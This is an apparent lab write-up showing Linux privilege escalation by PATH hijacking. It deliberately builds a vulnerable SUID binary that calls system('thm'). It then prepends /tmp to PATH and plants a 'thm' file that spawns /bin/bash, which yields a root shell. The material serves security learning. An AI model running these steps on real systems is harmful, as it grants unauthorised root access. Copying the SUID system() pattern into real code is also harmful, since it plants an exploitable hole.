# `Privilege Escalation by PATH variable`

For any command that is not built into the shell or that is not defined with an absolute path, Linux will start searching in folders defined under PATH. 

NOTE - (PATH is the environmental variable we're talking about here, whilw path is the location of a file).

If a folder for which your user has write permission is located in the path, you could potentially hijack an application to run a script.   

# The above line can be understood more easlity by below Example;

# Consider there is a binary named `testelf` which is created by root user and this has SUID permissions, which means if anyone executed it, it will be executed as root user/owner

┌──(root㉿kali)-[/home/kali/Desktop]
└─# `nano testelf_code.c`
                                  
┌──(root㉿kali)-[/home/kali/Desktop]
└─# `cat testelf_code.c` 
#include<unistd.h>
void main (){
setuid(0);
setgid(0);
system("thm");
}

                                        
┌──(root㉿kali)-[/home/kali/Desktop]
└─# `gcc testelf_code.c -o testelf`        
testelf_code.c: In function ‘main’:
testelf_code.c:3:1: warning: implicit declaration of function ‘system’ [-Wimplicit-function-declaration]
    3 | system("thm");
      | ^~~~~~
                                      
┌──(root㉿kali)-[/home/kali/Desktop]
└─# `ls`
testelf  testelf_code.c
                                       
┌──(root㉿kali)-[/home/kali/Desktop]
└─# `file testelf`
testelf: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=088e8c57118f7a2aa953946d11c0298f73c9007a, for GNU/Linux 3.2.0, not stripped
                                           
┌──(root㉿kali)-[/home/kali/Desktop]
└─# `ls -al `        
total 28
drwxr-xr-x  2 kali kali  4096 Jan 25 00:47 .
drwx------ 24 kali kali  4096 Jan 25 00:47 ..
-rwxr-xr-x  1 root root 15960 Jan 25 00:47 testelf
-rw-r--r--  1 root root    50 Jan 24 00:41 testelf_code.c
             
┌──(root㉿kali)-[/home/kali/Desktop]
└─# `chmod u+s testelf`
        
┌──(root㉿kali)-[/home/kali/Desktop]
└─# `ls -al`
total 28
drwxr-xr-x  2 kali kali  4096 Jan 25 08:31 .
drwx------ 24 kali kali  4096 Jan 25 08:29 ..
-rwsr-xr-x  1 root root 15960 Jan 25 08:31 testelf
-rw-r--r--  1 root root    50 Jan 24 00:41 testelf_code.c



# The above senerios is something we need to consider that root user has created

# Now Whenever this file `testelf` is executed it will look for `thm` binary inside the folders listed under envirnment variable `PATH`

# Now if any of the folders listed in that `PATH` variable is writable , then we can create a binary named `thm` in it and put our malicious code or whatever we want

# `Now lets proceed as attacker perspective`

# First thing is we need to find SUID binary and then observe there content, consider we already did enumweation and found a binary `testelf` which has following content

# Consider we already went through its content and we know that binary code actually calls `thm`

# next we need to find a floder in `PATH` variable which is writablle

# Basically these 4 conditions should satisfy to do privilege escalation

1. What folders are located under $PATH
2. Does your current user have write privileges for any of these folders?
3. Can you modify $PATH?
4. Is there a script/application you can start that will be affected by this vulnerability?


# Lets search for writable folders can done using the “find / -writable 2>/dev/null” command. The output of this command can be cleaned using a simple cut and sort sequence.

┌──(user㉿kali)-[/home/kali/Desktop]
└─$ `find / -writable 2>/dev/null | cut -d "/" -f 2 | sort -u`

sort                                                                      
dev
etc
home
proc
run
sys
tmp
usr
var

# We see tmp is wirtable but this dosent exist in our PATH variable, so consider that writable folder is tmp which is in PATH varibale, lets add it to path variablt to show this

└─$ `echo $PATH `     
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games

┌──(user㉿kali)-[/home/kali/Desktop]
└─$ `export PATH=/tmp:$PATH`

┌──(user㉿kali)-[/home/kali/Desktop]
└─$ `echo $PATH`
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games

# lets create executbale file in /tep which will be searched by testelf

┌──(user㉿kali)-[/tmp]
└─$ `echo "/bin/bash" > thm`

┌──(user㉿kali)-[/tmp]
└─$ `chmod 777 thm`

┌──(user㉿kali)-[/tmp]
└─$ `ls -l thm`
-rwxrwxrwx 1 user user 10 Jan 25 09:39 thm

# Now if we run that `testelf` , if will be able to find `thm` in `/tmp` folder listed in `PATH` variable which gives us bash shell for root user and we get root access

┌──(user㉿kali)-[/home/kali/Desktop]
└─$ ``./testelf`
┌──(root㉿kali)-[/home/kali/Desktop]
└─# `id`       
uid=0(root) gid=0(root) groups=0(root),1001(user)